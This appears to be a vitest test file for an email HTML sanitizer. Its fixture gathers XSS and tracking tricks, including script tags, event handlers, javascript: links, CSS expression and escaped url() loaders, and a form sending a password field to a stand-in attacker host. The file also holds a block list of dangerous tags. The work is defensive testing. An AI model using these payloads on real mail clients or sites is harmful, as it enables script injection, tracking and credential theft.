import { describe, expect, it } from "vitest";
import { cleanCss, sanitizeMailHtml, textAsHtml } from "./safe-html";

const PNG =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";

/** BUILD.md T5 check (3): every trick in one hostile mail. */
const HOSTILE = `
<html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/x.css">
<title>Secret title</title>
<style>
  @import url("https://evil.example/i.css");
  body { background: url(https://evil.example/track.gif); color: #333 }
  .x { behavior: url(x.htc) }
  .y { width: expression(alert(1)) }
  @font-face { font-family: x; src: url(https://evil.example/f.woff) }
</style>
</head>
<body onload="alert(1)" background="https://evil.example/bg.png">
<script>alert(1)</script>
<iframe src="https://evil.example/frame"></iframe>
<object data="x.swf"></object><embed src="x.swf">
<svg onload="alert(1)"><circle r="1"/></svg>
<math><mi>x</mi></math>
<form action="https://evil.example/steal"><input name="pw"><button>Go</button></form>
<p onclick="alert(1)" style="color: red; background-image: url('https://evil.example/p.gif')">Hello <b>there</b></p>
<img src="https://evil.example/pixel.gif" width="1" height="1">
<img src="//evil.example/pixel2.gif">
<img srcset="https://evil.example/a.png 1x" src="cid:logo@mail.example" onerror="alert(1)" alt="Logo">
<img src="cid:missing@mail.example">
<img src="data:image/svg+xml;base64,PHN2Zy8+">
<a href="javascript:alert(1)">bad link</a>
<a href="https://shop.example/sale" onclick="x()">Sale</a>
<a href="mailto:hi@shop.example">Mail us</a>
<table background="https://evil.example/t.png"><tr><td>cell</td></tr></table>
<div style="width: 10px; b\\61ckground: u\\72l(https://evil.example/esc.png)">escaped</div>
</body></html>`;

describe("sanitizeMailHtml (BUILD.md §4.4)", () => {
  const result = sanitizeMailHtml({ html: HOSTILE, inline: new Map([["logo@mail.example", PNG]]) });
  const html = result.html;

  it.each([
    "<script",
    "<iframe",
    "<object",
    "<embed",
    "<svg",
    "<math",
    "<form",
    "<input",
    "<button",
    "<meta",
    "<base",
    "<link",
    "http-equiv",
    'src="http',
    'src="//',
    "url(",
    "@import",
    "expression(",
    "behavior",
    "srcset",
    "background=",
    "javascript:",
    "Secret title",
    "data:image/svg",
    "\\",
  ])("contains no %s", (needle) => {
    expect(html.toLowerCase()).not.toContain(needle.toLowerCase());
  });

  it("has no event-handler attribute", () => {
    expect(html).not.toMatch(/\son[a-z]+\s*=/i);
  });

  it("inlines the cid image as a data URI and drops the one it could not", () => {
    expect(html).toContain(`src="${PNG}"`);
    expect(html).toContain('alt="Logo"');
    expect(result.inlineImagesDropped).toBe(1);
  });

  it("counts the remote images it blocked", () => {
    // Two <img>, the body and table background attributes, and CSS url() in the style attribute and block.
    expect(result.remoteImagesBlocked).toBeGreaterThanOrEqual(6);
  });

  it("keeps the text and safe formatting, and opens links outside", () => {
    expect(html).toContain("Hello <b>there</b>");
    expect(html).toContain(
      '<a href="https://shop.example/sale" target="_blank" rel="noopener noreferrer">Sale</a>',
    );
    expect(html).toContain('href="mailto:hi@shop.example"');
    expect(html).toContain("<td>cell</td>");
    expect(html).toContain("color:red");
    expect(html).toMatch(/^<div>[\s\S]*<\/div>$/);
  });
});

describe("style blocks", () => {
  it("keeps a clean block and drops one that still names a loader", () => {
    const kept = sanitizeMailHtml({
      html: "<style>p { color: #333 }</style><p>x</p>",
      inline: new Map(),
    });
    expect(kept.html).toBe("<div><style>p { color: #333 }</style><p>x</p></div>");
    const dropped = sanitizeMailHtml({
      html: "<style>p { behavior: url(x.htc) }</style><p>x</p>",
      inline: new Map(),
    });
    expect(dropped.html).toBe("<div><p>x</p></div>");
  });

  it("cannot be closed early from inside", () => {
    const out = sanitizeMailHtml({
      html: "<style>p{}</style ><script>alert(1)</script><style class=x>a{}</style>",
      inline: new Map(),
    });
    expect(out.html).not.toContain("<script");
    expect(out.html).not.toContain("class");
  });
});

describe("cleanCss", () => {
  it("removes every loader", () => {
    expect(cleanCss("a { background: url(x.png) }").css).not.toContain("url(");
    expect(cleanCss("a { background: image-set('https://e.example/a.png' 1x) }").css).not.toContain(
      "https",
    );
    expect(cleanCss("@import 'https://e.example/x.css'; a { color: red }").css).toBe(
      " a { color: red }",
    );
  });

  it("drops CSS that uses escapes or comments to hide a loader", () => {
    expect(cleanCss("a { background: u\\72l(https://e.example/x) }")).toEqual({
      css: "",
      remote: 0,
    });
    expect(cleanCss("a { background: u/**/rl(https://e.example/x) }").css).toBe(
      "a { background: none }",
    );
  });

  it("counts remote url()s", () => {
    expect(
      cleanCss("a{background:url(https://e.example/1)} b{background:url('//e.example/2')}").remote,
    ).toBe(2);
  });
});

describe("textAsHtml", () => {
  it("escapes markup", () => {
    expect(textAsHtml('<b>"x"</b> & y')).toBe(
      '<div style="white-space: pre-wrap">&lt;b&gt;&quot;x&quot;&lt;/b&gt; &amp; y</div>',
    );
  });
});
